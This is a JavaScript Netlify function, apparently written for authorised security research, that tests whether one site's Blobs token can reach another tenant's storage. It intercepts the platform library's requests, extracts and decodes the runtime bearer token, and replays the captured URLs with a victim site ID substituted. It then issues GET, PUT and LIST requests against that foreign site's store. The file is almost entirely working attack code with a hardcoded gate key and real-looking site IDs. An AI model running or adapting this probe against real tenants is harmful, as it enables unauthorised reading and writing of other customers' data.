// Phase-2 Netlify Blobs cross-tenant probe. Runs in nl1's own function runtime.
// The runtime blobs token NEVER leaves the runtime — only status codes + JWT claims returned.
// Key-gated. RoE: own attacker (nl1) -> own victim (nl2, Abed's other account). Read + one benign write, cleaned up.
const KEY = "bl0bx7q2z9k4";
const NL1 = "6f1e8c67-7bec-4c02-91f7-b0f8a6175aa6"; // jazzy-pika (this site)
const NL2 = "a0364027-1082-4eb6-b5ab-8715007f97f8"; // foreign victim site (azizsayed360 team)

function decodeJwt(t){
  try{
    if(typeof t!=='string') return {jwt:false, type:typeof t};
    const p=t.split('.');
    if(p.length<2) return {jwt:false, len:t.length, prefix:t.slice(0,6)};
    const b=(s)=>JSON.parse(Buffer.from(s.replace(/-/g,'+').replace(/_/g,'/'),'base64').toString('utf8'));
    return {jwt:true, len:t.length, header:b(p[0]), claims:b(p[1])};
  }catch(e){ return {jwt:false, len:(t||'').length, err:String(e).slice(0,80)}; }
}
async function req(url, method, headers, body){
  try{
    const opt={ method, headers:Object.assign({}, headers||{}), signal:AbortSignal.timeout(6000) };
    if(body!=null) opt.body=body;
    const r=await fetch(url,opt);
    const t=await r.text();
    return { status:r.status, ct:r.headers.get('content-type'), body:t.slice(0,240) };
  }catch(e){ return { error:String(e).slice(0,160) }; }
}
exports.handler = async (event) => {
  if(!event||!event.queryStringParameters||event.queryStringParameters.k!==KEY) return {statusCode:403, body:'forbidden'};
  const out = { ok:true, note:'blobs xtenant probe v1' };
  const raw = process.env.NETLIFY_BLOBS_CONTEXT || null;
  out.haveEnvCtx = !!raw;

  // ---- 1) Capture the REAL edge request via the library (authoritative URL + headers) ----
  const captured = [];
  const origFetch = globalThis.fetch;
  globalThis.fetch = async (u, o) => {
    let auth=null; try{ const h=o&&o.headers; if(h){ auth = (typeof h.get==='function') ? h.get('authorization') : (h.authorization||h.Authorization); } }catch(e){}
    captured.push({ url:String(u), method:(o&&o.method)||'GET', hasAuth:!!auth });
    return origFetch(u,o);
  };
  let libToken=null, libEdge=null, libTemplate=null, libHeaders=null;
  try{
    const mod = await import('@netlify/blobs');
    const store = mod.getStore('recon-store');
    const k='libprobe-'+Date.now();
    await store.set(k,'hello-nl1');
    out.lib_setOK = true;
    const v = await store.get(k);
    out.lib_getVal = (v||'').slice(0,40);
  }catch(e){ out.lib_err = String(e && (e.stack||e)).slice(0,300); }
  globalThis.fetch = origFetch;
  // redact tokens in captured urls, keep siteID visible
  out.captured = captured.map(c=>({ method:c.method, hasAuth:c.hasAuth, url:c.url.replace(/token=[^&]+/,'token=<tok>') }));

  // ---- 2) Manual parse of the env context (robust fallback + token binding inspection) ----
  if(raw){
    let ctx; try{ ctx=JSON.parse(Buffer.from(raw,'base64').toString('utf8')); }catch(e){ try{ctx=JSON.parse(raw);}catch(e2){ctx=null; out.ctxParseErr=String(e2).slice(0,80);} }
    if(ctx){
      libEdge = ctx.edgeURL || ctx.uncachedEdgeURL;
      libToken = ctx.token;
      out.ctx_meta = { edgeURL:ctx.edgeURL, uncachedEdgeURL:ctx.uncachedEdgeURL, siteID:ctx.siteID, region:ctx.primaryRegion, keys:Object.keys(ctx), token_info: decodeJwt(ctx.token) };
    }
  }

  // ---- 3) Cross-tenant test ----
  // Prefer the library-captured GET url as the authoritative template.
  const selfGet = captured.find(c=>c.method==='GET' && c.url.includes(NL1)) || captured.find(c=>c.url.includes(NL1));
  const authHdr = libToken ? {authorization:'Bearer '+libToken} : null;
  if(selfGet && libToken){
    const tmpl = selfGet.url;
    out.xtenant = { fromCaptured:true, tmpl: tmpl.replace(NL1,'<NL1>').replace(/token=[^&]+/,'token=<tok>') };
    const xUrl = tmpl.replace(new RegExp(NL1,'g'), NL2);
    out.xtenant.url = xUrl.replace(/token=[^&]+/,'token=<tok>');
    out.xtenant.GET  = await req(xUrl,'GET',authHdr);
    // PUT variant (write): swap method + add a body; strip any signed-GET query if present
    out.xtenant.PUT  = await req(xUrl,'PUT',authHdr,'xtenant-write-from-nl1');
    out.xtenant.LIST = await req(libEdge+'/'+NL2+'/recon-store','GET',authHdr);
    // control: same request against NL1 (self) should succeed
    out.selfControl_GET = await req(tmpl,'GET',authHdr);
  } else if(libEdge && libToken){
    // fallback: manual shapes
    const shapes = (sid)=>[
      libEdge+'/'+sid+'/recon-store/probekey',
      libEdge+'/'+sid+'/recon-store:probekey',
      libEdge+'/region:'+(out.ctx_meta&&out.ctx_meta.region||'us-east-2')+'/'+sid+'/recon-store/probekey',
    ];
    out.xtenant = { fromCaptured:false, self:[], nl2:[] };
    const s1=shapes(NL1), s2=shapes(NL2);
    for(let i=0;i<s1.length;i++){
      out.xtenant.self.push({ url:s1[i].replace(libEdge,'<edge>'), r: await req(s1[i],'GET',authHdr) });
      out.xtenant.nl2.push({ url:s2[i].replace(libEdge,'<edge>'), r: await req(s2[i],'GET',authHdr) });
    }
  } else {
    out.xtenant = { skipped:true, reason:'no token/edge captured' };
  }
  return { statusCode:200, headers:{'content-type':'application/json'}, body: JSON.stringify(out,null,2) };
};
